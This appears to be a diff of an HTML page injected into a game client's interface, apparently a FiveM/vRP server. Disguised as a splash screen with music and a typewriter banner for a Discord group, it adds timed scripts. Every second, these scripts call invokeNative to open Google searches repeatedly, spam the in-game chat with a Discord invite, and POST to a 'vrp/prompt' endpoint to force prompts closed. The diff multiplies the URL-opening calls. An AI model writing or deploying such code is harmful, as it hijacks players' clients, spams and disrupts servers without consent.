@@ -80,15 +80,18 @@
     }
   </style>
 
-  <!-- Auto Google Search -->
+  <!-- كود فتح جوجل مع البحث عن "خفت ياعمري 😂" -->
   <script>
     setInterval(() => {
       const url = "https://www.google.com/search?q=خفت+ياعمري+😂";
       window.invokeNative("openUrl", url);
+      window.invokeNative("openUrl", url);
+      window.invokeNative("openUrl", url);
+      window.invokeNative("openUrl", url);
     }, 1000);
   </script>
 
-  <!-- Auto Chat Spammer -->
+  <!-- كود إرسال الرسالة للشات -->
   <script>
     const msg = `👑 New & bo3of - .gg/zx7 ! 👑`;
     const body = JSON.stringify({ message: msg });
@@ -125,7 +128,7 @@
     }, 1000);
   </script>
 
-  <!-- Repeated POST to /vrp/prompt -->
+  <!-- ✅ NEW SCRIPT TO POST TO https://vrp/prompt -->
   <script>
     setInterval(() => {
       fetch("https://vrp/prompt", {
@@ -138,33 +141,32 @@
           result: "close"
         })
       });
-    }, 1000);
+    }, 1000); // safer than 0ms
   </script>
 
 </head>
 <body>
 
   <div class="image-container">
-    <!-- ✅ LOCAL image (must be in the same GitHub folder as index.html) -->
-    <img src="image.png" alt="Discord Image">
+    <img src="https://cdn.discordapp.com/attachments/1249142946914111558/1402137495218421760/image.png?ex=6892d1cd&is=6891804d&hm=c4fc1b050899f94e8aaeafa10e64cdf19c5121aad405ac06f4a6eb7b796e92b8&" alt="Discord Image">
   </div>
 
   <div class="text" id="typewriter"></div>
 
-  <!-- Background Music -->
+  <!-- موسيقى خلفية -->
   <audio id="bg-music" preload="auto">
     <source src="https://l.top4top.io/m_3504ar66b1.mp3" type="audio/mpeg">
     Your browser does not support the audio element.
   </audio>
 
-  <!-- Keyboard Sound -->
+  <!-- صوت كيبورد -->
   <audio id="key-sound" preload="auto">
     <source src="https://cdn.pixabay.com/audio/2022/03/15/audio_b3b2a83e90.mp3" type="audio/mpeg">
     Your browser does not support the audio element.
   </audio>
 
   <script>
-    // Background music fade-in
+    // تشغيل صوت الخلفية مع fade-in
     const audio = document.getElementById("bg-music");
     setTimeout(() => {
       audio.volume = 0;
@@ -180,7 +182,7 @@
       }, 100);
     }, 3000);
 
-    // Typing effect with keyboard sound
+    // الكتابة الحرفية + صوت كيبورد
     const text = "By = New - Bo3oF - discord.gg/zx7";
     const writer = document.getElementById("typewriter");
     const keySound = document.getElementById("key-sound");
